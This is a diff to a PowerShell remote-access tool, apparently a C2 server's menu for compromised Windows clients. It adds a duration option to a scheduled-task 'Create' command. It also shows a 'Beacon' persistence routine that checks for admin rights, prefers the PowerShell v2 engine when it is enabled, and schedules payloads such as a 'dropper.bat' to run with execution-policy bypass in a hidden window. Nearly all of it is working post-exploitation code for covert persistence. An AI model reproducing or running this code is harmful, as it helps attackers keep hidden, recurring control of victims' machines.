@@ -482,15 +482,18 @@ While($Client.Connected)
         }
         If($my_choise -eq "Create" -or $my_choise -eq "Create")
         {
-          write-Host " - Input TaskName: " -NoNewline;
+          write-Host " - Input TaskName to create: " -NoNewline;
           $TaskName = Read-Host;
-          write-Host " - Input Interval (minuts): " -NoNewline;
+          write-Host " - Input Interval (in minuts): " -NoNewline;
           $Interval = Read-Host;
+          write-Host " - Task Duration (from 1 TO 9 Hours): " -NoNewline;
+          $userinput = Read-Host;
+          $Display_dur = "$userinput"+"Hours";$Task_duration = "000"+"$userinput"+":00";
           write-host " Examples: 'cmd /c start calc.exe' [OR] '`$env:tmp\dropper.bat'" -ForegroundColor Blue -BackGroundColor White;
           write-Host " - Input Command|Binary Path: " -NoNewline;
           $execapi = Read-Host;
-          write-host " Create Task to execute with: $Interval minuts of interval." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
-          $Command = "cmd /R schtasks /Create /sc minute /mo $Interval /tn `"$TaskName`" /tr `"$execapi`";schtasks /Query /tn `"$TaskName`" `> schedule.txt;Get-content schedule.txt;Remove-Item schedule.txt -Force";
+          write-host "[*] This task wil have the max duration of $Display_dur" -ForegroundColor green;Start-Sleep -Seconds 1;write-host "`n`n";
+          $Command = "cmd /R schtasks /Create /sc minute /mo $Interval /tn `"$TaskName`" /tr `"$execapi`" /du $Task_duration;schtasks /Query /tn `"$TaskName`" `> schedule.txt;Get-content schedule.txt;Remove-Item schedule.txt -Force";
         }
         If($my_choise -eq "Delete" -or $my_choise -eq "Delete")
         {
@@ -787,10 +790,11 @@ While($Client.Connected)
           $execapi = Read-Host;
           write-Host " - Input Beacon Interval (minuts): " -NoNewline;
           $Interval = Read-Host;write-host "`n";
-          Write-Host "   TaskName      Client Remote Path" -ForeGroundColor green;
-          Write-Host "   --------      ------------------";
-          Write-Host "   $onjuyhg      $execapi";
+          Write-Host "   TaskName   Client Remote Path" -ForeGroundColor green;
+          Write-Host "   --------   ------------------";
+          Write-Host "   $onjuyhg   $execapi";
           write-host "`n";
+          ## Settings: ($stime == time-interval) | (/st 00:00 /du 0003:00 == 3 hours duration)
           $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 `> test.log;If(Get-Content test.log|Select-String `"Enabled`"){cmd /R schtasks /Create /sc minute /mo $Interval /tn `"$onjuyhg`" /tr `"powershell -version 2 -Execution Bypass -windowstyle hidden -NoProfile -File $execapi`";schtasks /Query /tn `"$onjuyhg`" `> schedule.txt;Get-content schedule.txt;Remove-Item schedule.txt -Force}else{cmd /R schtasks /Create /sc minute /mo $Interval /tn `"$onjuyhg`" /tr `"powershell -Execution Bypass -windowstyle hidden -NoProfile -File $execapi`";schtasks /Query /tn `"$onjuyhg`" `> schedule.txt;Get-content schedule.txt;Remove-Item schedule.txt -Force}}else{cmd /R schtasks /Create /sc minute /mo $Interval /tn `"$onjuyhg`" /tr `"powershell -Execution Bypass -windowstyle hidden -NoProfile -File $execapi`";schtasks /Query /tn `"$onjuyhg`" `> schedule.txt;Get-content schedule.txt;Remove-Item schedule.txt -Force}";
         }
         If($startup_choise -eq "WinLogon" -or $startup_choise -eq "logon")
